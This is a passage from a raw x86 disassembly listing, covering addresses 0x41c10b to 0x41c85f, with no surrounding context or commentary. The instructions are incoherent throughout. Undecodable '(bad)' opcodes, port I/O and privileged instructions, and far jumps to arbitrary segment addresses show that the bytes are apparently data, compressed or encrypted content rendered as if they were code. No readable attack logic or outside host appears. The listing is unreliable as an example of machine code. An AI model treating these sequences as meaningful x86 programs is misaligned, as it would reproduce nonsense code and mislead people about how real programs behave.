  41c10b:	or     bh,BYTE PTR [edi]
  41c10d:	out    0xae,al
  41c10f:	pop    edi
  41c110:	mov    ds:0x1fecbf91,al
  41c115:	xchg   ebx,eax
  41c116:	fnsave [edi-0x7f]
  41c119:	mov    ah,0x69
  41c11b:	push   cs
  41c11c:	mov    dl,0x10
  41c11e:	arpl   WORD PTR [edx+ecx*2-0x39],bp
  41c122:	mov    eax,ds:0xe361fac
  41c127:	stc    
  41c128:	test   eax,0xe1797d28
  41c12d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c12e:	inc    esi
  41c12f:	loope  0x41c0c7
  41c131:	mov    edx,0x9b155254
  41c136:	stc    
  41c137:	adc    eax,0xa37fd8d2
  41c13c:	in     al,dx
  41c13d:	cmp    eax,0x2e3b1b24
  41c142:	jl     0x41c0c7
  41c144:	fisttp QWORD PTR [edx-0x2b0a3385]
  41c14a:	test   al,0xd6
  41c14c:	gs (bad) 
  41c14e:	mov    ebp,0xa3d73d31
  41c153:	xor    BYTE PTR [ebx-0x3a8bf2c0],cl
  41c159:	add    eax,0xb190f989
  41c15e:	fidivr WORD PTR [esi+ecx*8-0x31]
  41c162:	cmp    DWORD PTR [ebp+ecx*2-0x44],0x35
  41c167:	pop    esp
  41c168:	mov    edx,0xb31cb9ef
  41c16d:	mov    ch,0x88
  41c16f:	dec    ecx
  41c170:	aas    
  41c171:	in     eax,dx
  41c172:	lea    ebx,[edi+ecx*4]
  41c175:	ins    BYTE PTR es:[edi],dx
  41c176:	mulps  xmm7,XMMWORD PTR [edx+0x75]
  41c17a:	je     0x41c130
  41c17c:	mov    ch,0xc8
  41c17e:	push   es
  41c17f:	or     BYTE PTR [ecx+0x5c],ah
  41c182:	dec    ebx
  41c183:	shl    DWORD PTR [eax+0x6],1
  41c186:	push   edx
  41c187:	jl     0x41c1a2
  41c189:	jmp    0x6adb:0x6f7e9cb4
  41c190:	std    
  41c191:	mul    DWORD PTR gs:[ebx+0x18]
  41c195:	or     DWORD PTR [ebp-0x7c],ebx
  41c198:	dec    edx
  41c199:	ret    
  41c19a:	sub    eax,0x1500ab48
  41c19f:	or     eax,0xafc5760
  41c1a4:	sbb    ecx,DWORD PTR [ebp-0x42eaa138]
  41c1aa:	aad    0xeb
  41c1ac:	push   edi
  41c1ad:	imul   BYTE PTR [edx-0x1757fdb6]
  41c1b3:	fyl2x  
  41c1b5:	retf   0x9176
  41c1b8:	sub    al,0xb9
  41c1ba:	mov    al,0x27
  41c1bc:	retf   
  41c1bd:	fs jge 0x41c1fa
  41c1c0:	sbb    BYTE PTR [ecx+0x16],ah
  41c1c3:	cmp    DWORD PTR [esi+ebx*1+0x50],ecx
  41c1c7:	iret   
  41c1c8:	dec    edx
  41c1c9:	mov    eax,0xbb0ad376
  41c1ce:	pop    ecx
  41c1cf:	(bad)  
  41c1d0:	push   ecx
  41c1d1:	clc    
  41c1d2:	dec    edx
  41c1d3:	or     al,0x8b
  41c1d5:	mov    ds:0x5c88ecd3,al
  41c1da:	lahf   
  41c1db:	imul   esp,DWORD PTR [esp+ebp*1+0xd01f5f8],0x5fc03e77
  41c1e6:	or     esi,esp
  41c1e8:	rcr    BYTE PTR [esi-0x58],1
  41c1eb:	lea    eax,[eax+0x2518edfe]
  41c1f1:	jle    0x41c202
  41c1f3:	outs   dx,BYTE PTR ds:[esi]
  41c1f4:	lea    esi,[esi]
  41c1f6:	cmp    eax,DWORD PTR [eax+edx*4+0x6e]
  41c1fa:	cs push ecx
  41c1fc:	ss loop 0x41c248
  41c1ff:	sti    
  41c200:	mov    ax,ds:0x6e6720e
  41c206:	sti    
  41c207:	dec    eax
  41c208:	enter  0x63dc,0xda
  41c20c:	dec    edx
  41c20d:	test   eax,0xd5a26e9
  41c212:	ss mov cl,dl
  41c215:	es ins BYTE PTR es:[edi],dx
  41c217:	or     DWORD PTR [edi],0x6def52d7
  41c21d:	mov    bh,BYTE PTR ds:0x660b2360
  41c223:	xchg   ebx,eax
  41c224:	add    DWORD PTR [ebp-0x24],ebp
  41c227:	push   ebx
  41c228:	ins    DWORD PTR es:[edi],dx
  41c229:	and    BYTE PTR [ebx],dl
  41c22b:	imul   esi,DWORD PTR fs:[ecx-0x69d517b4],0xe6e9096a
  41c236:	push   edx
  41c237:	in     al,0xe6
  41c239:	in     eax,0x7d
  41c23b:	xchg   esp,eax
  41c23c:	push   ecx
  41c23d:	push   ebx
  41c23e:	fcomp  DWORD PTR [ecx+0x3ce3f1b7]
  41c244:	mov    eax,0xd89ab8c6
  41c249:	popa   
  41c24a:	cmp    eax,0x5a20d27c
  41c24f:	fbstp  TBYTE PTR [eax+0x59]
  41c252:	aam    0xed
  41c254:	nop
  41c255:	or     al,0xfc
  41c257:	inc    ebx
  41c258:	xlat   BYTE PTR ds:[ebx]
  41c259:	mov    ds:0x40202ba4,al
  41c25e:	mov    ds:0x9eadf4ce,al
  41c263:	pop    esi
  41c264:	ror    BYTE PTR [esi-0x7b8d27fb],1
  41c26a:	add    edx,ebx
  41c26c:	sbb    bh,BYTE PTR [eax]
  41c26e:	add    eax,0x1cc72f3b
  41c273:	pop    ds
  41c274:	or     ebx,DWORD PTR [ecx]
  41c276:	push   ebx
  41c277:	pop    ss
  41c278:	fld    DWORD PTR es:[edi+0x5a]
  41c27c:	dec    ebp
  41c27d:	mov    esp,0x60a0b503
  41c282:	lock mov DWORD PTR [esi-0x9ad9b67],edx
  41c289:	(bad)  
  41c28a:	in     eax,0x59
  41c28c:	fstp   QWORD PTR [edx]
  41c28e:	jns    0x41c243
  41c290:	mov    dl,0xb7
  41c292:	inc    ebx
  41c293:	inc    esp
  41c294:	jns    0x41c246
  41c296:	fdiv   DWORD PTR [eax+eiz*4]
  41c299:	dec    ebp
  41c29a:	ds pop ebp
  41c29c:	les    edi,FWORD PTR ds:0xa63b9dab
  41c2a2:	call   0x99b9:0xf99e2371
  41c2a9:	add    bh,BYTE PTR [ecx-0xc]
  41c2ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c2ad:	out    dx,eax
  41c2ae:	push   eax
  41c2af:	pusha  
  41c2b0:	xor    bh,BYTE PTR [edx+0x47f200dc]
  41c2b6:	int    0x8
  41c2b8:	sbb    ebp,DWORD PTR [eax-0x4155d671]
  41c2be:	push   cs
  41c2bf:	pop    esi
  41c2c0:	std    
  41c2c1:	and    bl,BYTE PTR [eax-0x5d889f97]
  41c2c7:	retf   
  41c2c8:	jg     0x41c349
  41c2ca:	sbb    eax,0x9a98697c
  41c2cf:	dec    edx
  41c2d0:	mov    bl,0x45
  41c2d2:	out    0xc5,al
  41c2d4:	mov    ecx,0x4a623505
  41c2d9:	ss push cs
  41c2db:	aas    
  41c2dc:	jge    0x41c32b
  41c2de:	mov    esi,0xcdd36d2e
  41c2e3:	out    dx,eax
  41c2e4:	inc    eax
  41c2e5:	pop    eax
  41c2e6:	pop    esp
  41c2e7:	out    0xe4,eax
  41c2e9:	push   eax
  41c2ea:	xor    ecx,ecx
  41c2ec:	sbb    al,0xe5
  41c2ee:	outs   dx,DWORD PTR ds:[esi]
  41c2ef:	loopne 0x41c271
  41c2f1:	push   ebx
  41c2f2:	shl    BYTE PTR [ebp+0x7ef36af0],1
  41c2f8:	jnp    0x41c34e
  41c2fa:	mov    ah,0xff
  41c2fc:	pop    edx
  41c2fd:	push   esp
  41c2fe:	das    
  41c2ff:	das    
  41c300:	sub    bh,ah
  41c302:	add    eax,0x1f226d59
  41c307:	loopne 0x41c35f
  41c309:	xlat   BYTE PTR ds:[ebx]
  41c30a:	pushf  
  41c30b:	or     eax,0xf2488b93
  41c310:	jmp    0x41c37b
  41c312:	cmc    
  41c313:	sti    
  41c314:	rcr    DWORD PTR [eiz*2-0x12325222],1
  41c31b:	in     al,dx
  41c31c:	jns    0x41c307
  41c31e:	mov    eax,ds:0xddc85705
  41c323:	lahf   
  41c324:	pusha  
  41c325:	(bad)  
  41c327:	mov    al,BYTE PTR [ecx-0x75]
  41c32a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c32b:	mov    al,0x43
  41c32d:	stos   DWORD PTR es:[edi],eax
  41c32e:	mov    dh,0x77
  41c330:	call   0x4e6e9fb8
  41c335:	pop    esp
  41c336:	mov    ecx,DWORD PTR ds:0xf84b291e
  41c33c:	fcmovbe st,st(5)
  41c33e:	lods   al,BYTE PTR ds:[esi]
  41c33f:	push   eax
  41c340:	pop    esi
  41c341:	sbb    BYTE PTR [esi],dl
  41c343:	fistp  WORD PTR [edx+0x13]
  41c346:	out    0x7a,eax
  41c348:	icebp  
  41c349:	push   esi
  41c34a:	jmp    0xf19:0x659f3157
  41c351:	mov    eax,0x7f250b4e
  41c356:	fadd   DWORD PTR ds:0x5cd7020
  41c35c:	pop    ebp
  41c35d:	adc    DWORD PTR [ebx+esi*8],eax
  41c360:	mov    dh,0xb2
  41c362:	ins    BYTE PTR es:[edi],dx
  41c363:	cmc    
  41c364:	or     al,0x43
  41c366:	xor    ebp,DWORD PTR [ebx]
  41c368:	jo     0x41c30d
  41c36a:	xchg   edx,eax
  41c36b:	iret   
  41c36c:	rcr    BYTE PTR [edx-0x6c],cl
  41c36f:	into   
  41c370:	nop
  41c371:	popf   
  41c372:	repz loopne 0x41c34f
  41c375:	out    dx,eax
  41c376:	pop    ss
  41c377:	inc    si
  41c379:	aam    0x96
  41c37b:	sub    ch,dh
  41c37d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c37e:	cdq    
  41c37f:	aas    
  41c380:	inc    ebx
  41c381:	icebp  
  41c382:	test   al,0x9
  41c384:	sbb    DWORD PTR [esi+0x7d0b846],ecx
  41c38a:	push   ebp
  41c38b:	cmp    al,0xde
  41c38d:	imul   edi,DWORD PTR [eax*1-0x20fbfd39],0xc5a23dbe
  41c398:	ret    0x2b42
  41c39b:	test   eax,0x21150758
  41c3a0:	or     BYTE PTR [ebx+edi*2-0x2079b9ea],bh
  41c3a7:	xchg   edx,eax
  41c3a8:	push   edi
  41c3a9:	out    dx,eax
  41c3aa:	aaa    
  41c3ab:	mov    ecx,0x43b210ed
  41c3b0:	data16 mov al,0x87
  41c3b3:	fnstsw WORD PTR gs:[esi+0x68a6ce99]
  41c3ba:	push   ebx
  41c3bb:	cwde   
  41c3bc:	or     eax,0x1e1bd76d
  41c3c1:	sbb    BYTE PTR [eax+eax*2],cl
  41c3c4:	cmp    DWORD PTR [edx+eax*1+0xe],0x22
  41c3c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c3ca:	add    eax,0x2e5459d6
  41c3cf:	pop    eax
  41c3d0:	in     eax,0x1f
  41c3d2:	or     ch,BYTE PTR [edi]
  41c3d4:	dec    edx
  41c3d5:	dec    eax
  41c3d6:	sbb    esi,esp
  41c3d8:	(bad)  
  41c3d9:	pop    ecx
  41c3da:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c3dc:	mov    ecx,0x60ac7f47
  41c3e1:	jge    0x41c459
  41c3e3:	das    
  41c3e4:	xor    ecx,0x5b
  41c3e7:	fwait
  41c3e8:	mov    WORD PTR [eax],fs
  41c3ea:	mov    edi,0x508559f8
  41c3ef:	mov    esi,0x6ca306d4
  41c3f4:	or     al,0xa7
  41c3f6:	test   eax,0x279ae7c
  41c3fb:	aam    0x2
  41c3fd:	xchg   ebx,eax
  41c3fe:	iret   
  41c3ff:	les    ecx,FWORD PTR [ecx-0x390b40f1]
  41c405:	adc    eax,0x471d18d5
  41c40a:	aad    0xe9
  41c40c:	xor    edi,eax
  41c40e:	inc    ecx
  41c40f:	ja     0x41c48f
  41c411:	push   ss
  41c412:	in     eax,0xe
  41c414:	test   DWORD PTR [esi],ecx
  41c416:	ja     0x41c47b
  41c418:	lods   eax,DWORD PTR ds:[esi]
  41c419:	fs scas eax,DWORD PTR es:[edi]
  41c41b:	sbb    BYTE PTR [edi+0x7d97ec5c],bh
  41c421:	xor    eax,0x658fde68
  41c426:	repz imul ebx,DWORD PTR [esi],0x7c9c8599
  41c42d:	das    
  41c42e:	adc    eax,0xab1bc82
  41c433:	xor    al,0x4
  41c435:	xchg   bl,dl
  41c437:	and    DWORD PTR [ebp-0x4a],0x5a
  41c43b:	ret    
  41c43c:	push   ecx
  41c43d:	sbb    DWORD PTR [esp+ebp*4+0x44dfa729],0xf81ddb8
  41c448:	cli    
  41c449:	dec    eax
  41c44a:	mov    ah,0x96
  41c44c:	fs push 0xffffffb6
  41c44f:	jmp    0xedebcc60
  41c454:	add    eax,0xe833c1e9
  41c459:	call   0xc761:0xdca29d32
  41c460:	pop    ebp
  41c461:	fisttp WORD PTR [edx-0xf]
  41c464:	inc    edx
  41c465:	sbb    dl,bl
  41c467:	in     al,dx
  41c468:	jg     0x41c402
  41c46a:	inc    esp
  41c46b:	jns    0x41c42f
  41c46d:	xchg   BYTE PTR [ebp-0x2c72db45],bl
  41c473:	jno    0x41c45d
  41c475:	stos   DWORD PTR es:[edi],eax
  41c476:	or     esi,0xa178a501
  41c47c:	xor    DWORD PTR [edi],edx
  41c47e:	lods   eax,DWORD PTR ds:[esi]
  41c47f:	scas   al,BYTE PTR es:[edi]
  41c480:	shl    esp,1
  41c482:	ret    0x2835
  41c485:	cmp    DWORD PTR [ecx],esp
  41c487:	aam    0xb0
  41c489:	neg    BYTE PTR [edi+0x4658f7e8]
  41c48f:	cmp    bl,BYTE PTR [ebp-0x567754bd]
  41c495:	add    esp,esp
  41c497:	pusha  
  41c498:	outs   dx,BYTE PTR ss:[esi]
  41c49a:	xor    esp,DWORD PTR [esp+edx*4-0x57]
  41c49e:	pushf  
  41c49f:	(bad)  
  41c4a0:	jmp    0x5b8480df
  41c4a5:	pop    ss
  41c4a6:	cs inc ecx
  41c4a8:	and    DWORD PTR [edx],esi
  41c4aa:	and    ch,BYTE PTR [ecx]
  41c4ac:	lahf   
  41c4ad:	cmc    
  41c4ae:	repnz and eax,0xc8cc341a
  41c4b4:	sub    DWORD PTR [eax],0x22
  41c4b7:	lea    ebx,[eax]
  41c4b9:	test   BYTE PTR [ecx-0xb231c3],0xf3
  41c4c0:	mov    esp,0xe7bbb5c7
  41c4c5:	sbb    DWORD PTR [ebx+0x19bdb87a],ebx
  41c4cb:	mov    ebx,0xc233194f
  41c4d0:	cdq    
  41c4d1:	sbb    BYTE PTR [ebp-0x75069ff1],bh
  41c4d7:	retf   
  41c4d8:	scas   al,BYTE PTR es:[edi]
  41c4d9:	jb     0x41c492
  41c4db:	fistp  QWORD PTR [edi]
  41c4dd:	sub    bl,BYTE PTR [esi-0x40]
  41c4e0:	xchg   ecx,eax
  41c4e1:	sub    edx,edi
  41c4e3:	popa   
  41c4e4:	and    al,0x32
  41c4e6:	dec    ecx
  41c4e7:	les    edi,FWORD PTR [eax]
  41c4e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c4ea:	push   esp
  41c4eb:	fnstsw WORD PTR [esi+0x6c]
  41c4ee:	cwde   
  41c4ef:	iret   
  41c4f0:	mov    esi,ebx
  41c4f2:	push   0xffffffaf
  41c4f4:	inc    ebx
  41c4f5:	push   ebx
  41c4f6:	sub    al,BYTE PTR [edx]
  41c4f8:	ja     0x41c4b0
  41c4fa:	ins    DWORD PTR es:[edi],dx
  41c4fb:	jns    0x41c4d6
  41c4fd:	mov    BYTE PTR [esi],bh
  41c4ff:	enter  0xc929,0x87
  41c503:	(bad)  
  41c505:	(bad)  
  41c506:	pop    edx
  41c507:	sahf   
  41c508:	xor    al,0x65
  41c50a:	xchg   ebp,eax
  41c50b:	std    
  41c50c:	fwait
  41c50d:	call   0x2b9d5a2d
  41c512:	xor    eax,DWORD PTR [ebx-0x17797f1a]
  41c518:	popa   
  41c519:	adc    eax,0xec52ef33
  41c51e:	jle    0x41c54c
  41c520:	add    ebx,DWORD PTR [esi-0x10]
  41c523:	sbb    eax,0x9ed7c8f7
  41c528:	pusha  
  41c529:	mov    al,gs:0xe01196bf
  41c52f:	mov    eax,0xbab6220e
  41c534:	jno    0x41c4e0
  41c536:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c537:	or     al,0xb1
  41c539:	jo     0x41c546
  41c53b:	sar    BYTE PTR [ecx],0x3c
  41c53e:	and    ebp,0x2e
  41c541:	adc    al,0x7f
  41c543:	fsubr  DWORD PTR [edi+esi*1-0x30519023]
  41c54a:	and    al,0x51
  41c54c:	es xor cl,dl
  41c54f:	into   
  41c550:	mov    eax,0x51e0659c
  41c555:	int3   
  41c556:	std    
  41c557:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c558:	data16 jno 0x41c566
  41c55b:	mov    WORD PTR [ebx-0x6953db49],?
  41c561:	jno    0x41c5bc
  41c563:	inc    esp
  41c564:	jg     0x41c51e
  41c566:	push   edi
  41c567:	mov    ds:0xcdda9bff,eax
  41c56c:	push   ebp
  41c56d:	mov    dl,0xd1
  41c56f:	clc    
  41c570:	mov    esp,0x673517db
  41c575:	mov    ecx,0x5e6db619
  41c57a:	jecxz  0x41c54a
  41c57c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c57d:	inc    eax
  41c57e:	out    0x27,eax
  41c580:	jl     0x41c542
  41c582:	xor    ah,BYTE PTR [ebx+0x77]
  41c585:	xor    cl,BYTE PTR [eax+0x25]
  41c588:	imul   ebx,eax,0x62
  41c58b:	into   
  41c58c:	ret    
  41c58d:	or     esp,0xffffffc0
  41c590:	in     eax,dx
  41c591:	fisttp DWORD PTR [edi]
  41c593:	adc    edi,edx
  41c595:	or     BYTE PTR [edi],0x97
  41c598:	xor    eax,0xd00fe158
  41c59d:	or     DWORD PTR [edi-0x48],ebx
  41c5a0:	ins    DWORD PTR es:[edi],dx
  41c5a1:	push   esi
  41c5a2:	sbb    eax,0xf23f0fee
  41c5a7:	scas   eax,DWORD PTR es:[edi]
  41c5a8:	scas   al,BYTE PTR es:[edi]
  41c5a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c5aa:	pop    ds
  41c5ab:	mov    dh,0x27
  41c5ad:	adc    BYTE PTR [ebp-0x63],bh
  41c5b0:	xchg   BYTE PTR [edi+0x51699f6],bl
  41c5b6:	pop    ebx
  41c5b7:	pop    ebx
  41c5b8:	repz mov esp,0xbb7d0017
  41c5be:	xor    esp,0x46
  41c5c1:	adc    eax,0x72816f5e
  41c5c6:	adc    DWORD PTR [ebx-0x4a1f84f2],ecx
  41c5cc:	outs   dx,BYTE PTR ss:[esi]
  41c5ce:	outs   dx,BYTE PTR ds:[esi]
  41c5cf:	pusha  
  41c5d0:	sar    DWORD PTR [ebx],cl
  41c5d2:	jg     0x41c648
  41c5d4:	mov    DWORD PTR [ecx-0x2f],esp
  41c5d7:	std    
  41c5d8:	xchg   bh,dh
  41c5da:	dec    ecx
  41c5db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c5dc:	inc    ebp
  41c5dd:	cmc    
  41c5de:	jmp    0x41c568
  41c5e0:	sub    eax,0x1f428c33
  41c5e5:	push   esi
  41c5e6:	stos   DWORD PTR es:[edi],eax
  41c5e7:	mov    esi,0x2c3d77af
  41c5ec:	rcr    BYTE PTR [eax+0x426d66e],cl
  41c5f2:	cli    
  41c5f3:	mov    ?,WORD PTR [ebx-0xefa5aa9]
  41c5f9:	adc    DWORD PTR [ebp+0x7a],ecx
  41c5fc:	fdivr  DWORD PTR [esi-0x4d]
  41c5ff:	(bad)  
  41c601:	dec    ecx
  41c602:	sbb    eax,0x3df2db33
  41c607:	es (bad) 
  41c609:	out    dx,al
  41c60a:	add    BYTE PTR [ebx],bh
  41c60c:	pop    ebx
  41c60d:	xchg   edi,eax
  41c60e:	or     eax,0x88c56f3c
  41c613:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c614:	jae    0x41c65b
  41c616:	ror    BYTE PTR [eax],1
  41c618:	inc    eax
  41c619:	lds    edi,FWORD PTR [esi-0x4efa7d4]
  41c61f:	add    dl,BYTE PTR cs:[ebp+0x7]
  41c623:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c624:	data16 fistp QWORD PTR [edx]
  41c627:	mov    edx,0x7a69db51
  41c62c:	mov    ebp,0x314d1959
  41c631:	xchg   ecx,eax
  41c632:	and    ebp,DWORD PTR [ebx+0x2a]
  41c635:	popa   
  41c636:	stos   DWORD PTR es:[edi],eax
  41c637:	test   eax,0x98d5ce29
  41c63c:	adc    al,0x89
  41c63e:	sbb    BYTE PTR [ebp+0x2a],0x86
  41c642:	imul   eax,DWORD PTR [esi-0x7ce7a747],0x425c1e56
  41c64c:	sbb    ah,BYTE PTR [ebx-0x15]
  41c64f:	sbb    DWORD PTR [edx+0x35],eax
  41c652:	push   ecx
  41c653:	mov    al,0xfd
  41c655:	shl    BYTE PTR [ebp-0x56],cl
  41c658:	add    esi,DWORD PTR [edi-0x6c77b195]
  41c65e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c65f:	rcl    DWORD PTR [esi],cl
  41c661:	les    ebx,FWORD PTR [edi-0x49]
  41c664:	call   0xe94b7405
  41c669:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c66a:	lods   eax,DWORD PTR ds:[esi]
  41c66b:	mov    ah,0x25
  41c66d:	ror    BYTE PTR [eax],cl
  41c66f:	lahf   
  41c670:	lds    eax,FWORD PTR [esi+0x796853a5]
  41c676:	pop    ds
  41c677:	out    0xed,al
  41c679:	jnp    0x41c6e0
  41c67b:	and    esp,DWORD PTR [eax-0xf7eaffe]
  41c681:	pop    eax
  41c682:	xchg   BYTE PTR [edx-0x53d75402],bl
  41c688:	outs   dx,DWORD PTR ds:[esi]
  41c689:	popa   
  41c68a:	mov    es,esp
  41c68c:	pop    ss
  41c68d:	sub    eax,edx
  41c68f:	sar    BYTE PTR [edi+0x62],1
  41c692:	adc    cl,cl
  41c694:	loope  0x41c714
  41c696:	pop    eax
  41c697:	cmp    edi,DWORD PTR [eax-0x9]
  41c69a:	add    cl,BYTE PTR [ebp-0xfcfa6db]
  41c6a0:	jae    0x41c6b4
  41c6a2:	jbe    0x41c719
  41c6a4:	sbb    al,0x7
  41c6a6:	out    dx,al
  41c6a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c6a8:	fistp  WORD PTR [ebp-0x2c8d31f8]
  41c6ae:	(bad)  
  41c6af:	fwait
  41c6b0:	cwde   
  41c6b1:	xchg   edx,eax
  41c6b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c6b3:	call   0xbf3e:0xabfc47fa
  41c6ba:	adc    al,0xd4
  41c6bc:	fwait
  41c6bd:	lods   al,BYTE PTR ds:[esi]
  41c6be:	das    
  41c6bf:	jbe    0x41c724
  41c6c1:	dec    edx
  41c6c2:	test   edi,edi
  41c6c4:	outs   dx,DWORD PTR ds:[esi]
  41c6c5:	in     al,dx
  41c6c6:	ret    
  41c6c7:	mov    edx,0x91d3511b
  41c6cc:	pusha  
  41c6cd:	adc    eax,0x1b752105
  41c6d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c6d3:	xchg   BYTE PTR [ebx-0x18],bh
  41c6d6:	(bad)  
  41c6d7:	and    bl,BYTE PTR [eax+0x61561d1b]
  41c6dd:	inc    esp
  41c6de:	xor    al,0x32
  41c6e0:	mov    eax,0x15e866c5
  41c6e5:	xor    BYTE PTR [ebp+0x5c],bl
  41c6e8:	dec    esp
  41c6e9:	dec    edi
  41c6ea:	arpl   WORD PTR [ebp-0x68],ax
  41c6ed:	inc    esp
  41c6ee:	icebp  
  41c6ef:	ja     0x41c682
  41c6f1:	mov    al,0x59
  41c6f3:	sbb    al,0x24
  41c6f5:	push   edx
  41c6f6:	push   0xfb89cdf6
  41c6fb:	out    0x84,eax
  41c6fd:	mov    ?,WORD PTR [ebx-0x3a]
  41c700:	jo     0x41c710
  41c702:	dec    edi
  41c703:	push   ss
  41c704:	add    eax,0xbd3f8916
  41c709:	das    
  41c70a:	popf   
  41c70b:	fs mov cl,0xbc
  41c70e:	jg     0x41c738
  41c710:	(bad)  
  41c711:	test   DWORD PTR [ebp-0x1a7784e],0x3160c970
  41c71b:	in     al,0x40
  41c71d:	or     BYTE PTR [eax],bl
  41c71f:	in     al,0xfd
  41c721:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c722:	mul    edx
  41c724:	shr    DWORD PTR [edi],0x77
  41c727:	adc    bh,bh
  41c729:	mov    ecx,0x161f2490
  41c72e:	dec    ebp
  41c72f:	push   cs
  41c730:	sbb    DWORD PTR [ebx-0x42365347],0x13
  41c737:	lods   al,BYTE PTR ds:[esi]
  41c738:	shl    BYTE PTR [edi-0x40],1
  41c73b:	xor    BYTE PTR [ebp-0x2e],0xab
  41c73f:	rsqrtps xmm1,XMMWORD PTR [esi-0x7869528b]
  41c746:	cld    
  41c747:	les    edx,FWORD PTR [eax+ebp*1+0x651aa287]
  41c74e:	int3   
  41c74f:	jae    0x41c72a
  41c751:	cdq    
  41c752:	ret    
  41c753:	leave  
  41c754:	add    BYTE PTR [ebx],ch
  41c756:	pop    eax
  41c757:	enter  0xa44c,0x67
  41c75b:	dec    edx
  41c75c:	pop    ebp
  41c75d:	and    DWORD PTR [ecx+0x39],esi
  41c760:	xchg   edi,eax
  41c761:	in     eax,dx
  41c762:	js     0x41c791
  41c764:	cmp    eax,0x130d216e
  41c769:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c76a:	lods   eax,DWORD PTR ds:[esi]
  41c76b:	pop    ecx
  41c76c:	ins    DWORD PTR es:[edi],dx
  41c76d:	jmp    0xeade:0xf6e39d6c
  41c774:	add    edi,DWORD PTR [ebx+0x13a69c7a]
  41c77a:	xchg   ebp,eax
  41c77b:	shl    DWORD PTR [esi+ebp*8-0x43],cl
  41c77f:	and    BYTE PTR [ebp+0x68fad097],ah
  41c785:	cwde   
  41c786:	repz sub edx,DWORD PTR fs:[eax]
  41c78a:	pop    ecx
  41c78b:	add    al,0x14
  41c78d:	mov    eax,ds:0xa1f0cb5c
  41c792:	or     ecx,DWORD PTR [eax+edi*4]
  41c795:	push   ecx
  41c796:	sbb    DWORD PTR [esi+0x7adb48bd],ebx
  41c79c:	inc    esp
  41c79d:	iret   
  41c79e:	stos   BYTE PTR es:[edi],al
  41c79f:	scas   al,BYTE PTR es:[edi]
  41c7a0:	inc    esp
  41c7a1:	xchg   edx,eax
  41c7a2:	mul    edx
  41c7a4:	inc    esp
  41c7a5:	push   edi
  41c7a6:	or     cl,dh
  41c7a8:	or     DWORD PTR [esi+0x101d1cdf],eax
  41c7ae:	pop    ecx
  41c7af:	sar    DWORD PTR [ebp-0x1c09dfe3],1
  41c7b5:	push   eax
  41c7b6:	cmp    ch,BYTE PTR [ecx+ebx*2+0x0]
  41c7ba:	cmp    DWORD PTR [ecx-0x10],eax
  41c7bd:	push   ecx
  41c7be:	ins    BYTE PTR es:[edi],dx
  41c7bf:	add    al,0xcf
  41c7c1:	mov    cl,0xff
  41c7c3:	fdiv   DWORD PTR [edx+0xafcf812]
  41c7c9:	inc    ebx
  41c7ca:	xchg   esp,eax
  41c7cb:	mov    gs,WORD PTR [edi]
  41c7cd:	retf   0x68f7
  41c7d0:	std    
  41c7d1:	(bad)  
  41c7d2:	addr16 and al,0xf8
  41c7d5:	jl     0x41c7cc
  41c7d7:	adc    eax,0x303c0952
  41c7dc:	in     eax,0xdd
  41c7de:	aad    0x8f
  41c7e0:	pusha  
  41c7e1:	aaa    
  41c7e2:	add    BYTE PTR [eax+0x6],dh
  41c7e5:	inc    ebp
  41c7e6:	aam    0xdb
  41c7e8:	not    DWORD PTR [ecx]
  41c7ea:	fisttp QWORD PTR [eax-0xb389832]
  41c7f0:	nop
  41c7f1:	cdq    
  41c7f2:	cwde   
  41c7f3:	fsub   DWORD PTR [esi]
  41c7f5:	bound  edx,QWORD PTR [edi+esi*1-0x2e]
  41c7f9:	lods   eax,DWORD PTR ds:[esi]
  41c7fa:	inc    ecx
  41c7fb:	xor    ecx,edi
  41c7fd:	lds    eax,FWORD PTR [ecx-0x1df0d522]
  41c803:	aad    0xb8
  41c805:	cli    
  41c806:	inc    edi
  41c807:	jl     0x41c833
  41c809:	jbe    0x41c86f
  41c80b:	outs   dx,BYTE PTR ds:[esi]
  41c80c:	popf   
  41c80d:	in     al,dx
  41c80e:	inc    ebx
  41c80f:	cvtps2pd xmm5,QWORD PTR [edi*2+0x56884e58]
  41c817:	push   0x29
  41c819:	not    BYTE PTR [ebp+0x7]
  41c81c:	iret   
  41c81d:	and    BYTE PTR [eax+0x10],bh
  41c820:	push   ss
  41c821:	sbb    esp,DWORD PTR [edx]
  41c823:	sbb    BYTE PTR [esi+0x720c6a7a],bh
  41c829:	and    BYTE PTR [esi-0x3b],0x3
  41c82d:	mov    ds:0x530a5ca8,al
  41c832:	inc    edx
  41c833:	cmp    edx,ebp
  41c835:	cld    
  41c836:	xchg   ecx,eax
  41c837:	or     eax,0xc13f951e
  41c83c:	inc    esi
  41c83d:	rol    BYTE PTR [edi+0x6d81ca05],cl
  41c843:	fnstenv [edx]
  41c845:	dec    edi
  41c846:	(bad)  
  41c847:	sbb    DWORD PTR [edx-0x4],ecx
  41c84a:	js     0x41c801
  41c84c:	out    dx,al
  41c84d:	add    DWORD PTR [edi+0xdabff],edx
  41c853:	fidivr DWORD PTR [edx]
  41c855:	aad    0x18
  41c857:	mov    al,0x6f
  41c859:	ins    DWORD PTR es:[edi],dx
  41c85a:	xlat   BYTE PTR ds:[ebx]
  41c85b:	cmp    ah,BYTE PTR [ebp-0x53]
  41c85e:	xchg   ecx,eax
  41c85f:	adc    eax,0x411127d2
